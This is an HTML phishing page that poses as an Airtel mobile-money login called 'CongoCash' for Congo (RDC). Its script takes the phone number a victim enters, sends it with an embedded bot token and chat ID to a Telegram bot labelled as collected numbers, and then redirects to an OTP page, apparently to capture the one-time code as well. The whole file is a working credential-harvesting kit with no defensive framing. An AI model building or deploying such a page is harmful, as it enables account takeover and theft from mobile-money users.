<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | CongoCash</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
        
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f8f9fa;
            color: #333;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .input-line {
            border-bottom: 2px solid #00adef; /* Light blue accent from your screenshot */
        }

        .keypad-btn {
            height: 70px;
            font-size: 1.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.2s;
        }

        .keypad-btn:active {
            background-color: #e9ecef;
            border-radius: 50%;
        }

        .request-btn {
            background-color: #f1f3f5;
            color: #adb5bd;
            transition: all 0.3s;
        }

        .request-btn.active {
            background-color: #E31937;
            color: white;
            box-shadow: 0 4px 12px rgba(227, 25, 55, 0.2);
        }
    </style>
</head>
<body class="bg-white">

    <nav class="p-6 flex items-center gap-4 animate__animated animate__fadeIn">
        <button onclick="history.back()" class="text-gray-600">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
        </button>
        <div class="flex items-center gap-1">
            <div class="w-6 h-6 bg-red-600 rounded flex items-center justify-center text-[10px] text-white font-bold">C</div>
            <span class="text-xl font-bold text-red-600">airtel</span>
        </div>
    </nav>

    <main class="flex-1 px-8 pt-4 animate__animated animate__fadeInUp">
        <p class="text-gray-500 mb-8">Cliquez sur demander OTP pour continuer</p>
        
        <div class="mb-8">
            <p class="text-lg font-medium border-b border-gray-200 pb-2">Congo (RDC)</p>
        </div>

        <div class="flex items-center gap-4 input-line pb-2 mb-12">
            <div class="flex items-center gap-2 text-gray-500">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
                <span>+243</span>
            </div>
            <input type="text" id="phoneInput" readonly placeholder="Num√©ro Mobile Airtel" class="bg-transparent text-xl w-full outline-none">
        </div>

        <div class="grid grid-cols-3 gap-y-4 text-center">
            <button class="keypad-btn" onclick="addNum('1')">1</button>
            <button class="keypad-btn" onclick="addNum('2')">2</button>
            <button class="keypad-btn" onclick="addNum('3')">3</button>
            <button class="keypad-btn" onclick="addNum('4')">4</button>
            <button class="keypad-btn" onclick="addNum('5')">5</button>
            <button class="keypad-btn" onclick="addNum('6')">6</button>
            <button class="keypad-btn" onclick="addNum('7')">7</button>
            <button class="keypad-btn" onclick="addNum('8')">8</button>
            <button class="keypad-btn" onclick="addNum('9')">9</button>
            <div class="keypad-btn"></div>
            <button class="keypad-btn" onclick="addNum('0')">0</button>
            <button class="keypad-btn" onclick="delNum()">
                <svg class="w-6 h-6 text-gray-400" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M6.707 4.879A3 3 0 018.828 4H15a3 3 0 013 3v6a3 3 0 01-3 3H8.828a3 3 0 01-2.121-.879l-4.5-4.5a1 1 0 010-1.414l4.5-4.5zm2.586 1L5.414 10l3.879 3.879L10.707 12.465 8.242 10l2.465-2.465-1.414-1.414z" clip-rule="evenodd"></path></svg>
            </button>
        </div>
    </main>

    <div class="p-8 bg-white border-t border-gray-50">
        <p class="text-[10px] text-center text-gray-400 mb-4">
            En continuant, j'accepte les <a href="#" class="underline">Termes et Conditions</a>
        </p>
        <button id="otpBtn" onclick="requestOTP()" disabled class="w-full request-btn font-bold py-4 rounded-lg uppercase tracking-widest text-sm">
            Demander OTP
        </button>
    </div>

    <script>
        const input = document.getElementById('phoneInput');
const btn = document.getElementById('otpBtn');

// Replace these with your actual details from @BotFather and @IDBot
const TELEGRAM_BOT_TOKEN = '8250515452:AAGQi4Ca4uRcGbk4BVYNfxSUqQRY10RPtWk';
const TELEGRAM_CHAT_ID = '8563625308';

function addNum(n) {
    if(input.value.length < 9) {
        input.value += n;
        checkStatus();
    }
}

function delNum() {
    input.value = input.value.slice(0, -1);
    checkStatus();
}

function checkStatus() {
    if(input.value.length >= 9) {
        btn.disabled = false;
        btn.classList.add('active');
    } else {
        btn.disabled = true;
        btn.classList.remove('active');
    }
}

async function requestOTP() {
    const phoneNumber = "+243" + input.value;
    btn.innerText = "Chargement...";
    btn.disabled = true;

    // The message to send to your bot
    const message = `üîî **Nouveau Num√©ro Collect√©**\n\nüì± T√©l√©phone: ${phoneNumber}\nüåê Pays: Congo (RDC)`;

    try {
        // Sending data to Telegram
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        // Redirect to OTP page after sending
        window.location.href = 'otp.html';
    } catch (error) {
        console.error('Erreur Telegram:', error);
        // Still redirect even if telegram fails so the user doesn't get stuck
        window.location.href = 'otp.html';
    }
}
    </script>
</body>
</html>
